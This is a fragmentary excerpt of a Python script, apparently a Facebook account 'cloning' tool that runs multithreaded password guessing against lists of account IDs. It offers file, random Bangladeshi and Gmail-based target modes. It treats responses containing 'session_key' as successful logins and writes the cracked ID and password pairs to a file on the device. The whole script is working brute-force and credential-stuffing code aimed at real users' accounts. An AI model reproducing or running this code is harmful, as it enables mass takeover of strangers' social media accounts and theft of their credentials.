...
\033[91;1m--------------------------------------------------""")
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://www.facebook.com/groups/551365756758487/permalink/602302294998166/?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def Hasan():
	clear()
	#ckx()
	print(f" \033[1;91m[\033[1;97mA\033[1;91m]\033[1;32m FILE CLONE \033[1;97m(Working) ")
	print(f" \033[1;91m[\033[1;97mB\033[1;91m]\033[1;32m BD R4NDOM CLONAR \033[1;97m(Working)")
	print(f" \033[1;91m[\033[1;97mC\033[1;91m]\033[1;32m GMAIL CLONE \033[1;97m(Working)")
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mTotal account : \033[1;32m'+total_ids+f' \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mMethod > \033[1;37mM{mthd}')
			print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Use flight mode for speed up\033[1;37m")
			print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mWorking Data+Wifi \033[1;94m")
			linex()
			for user in fo:
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print('  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mTotal account : \033[1;32m'+tl)
...
def gml():
                ...
                print(f" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
                print(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mName Example : Alam, hossen, hossain')
                print(f" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
...
def apix(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [BRAND-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/HASAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
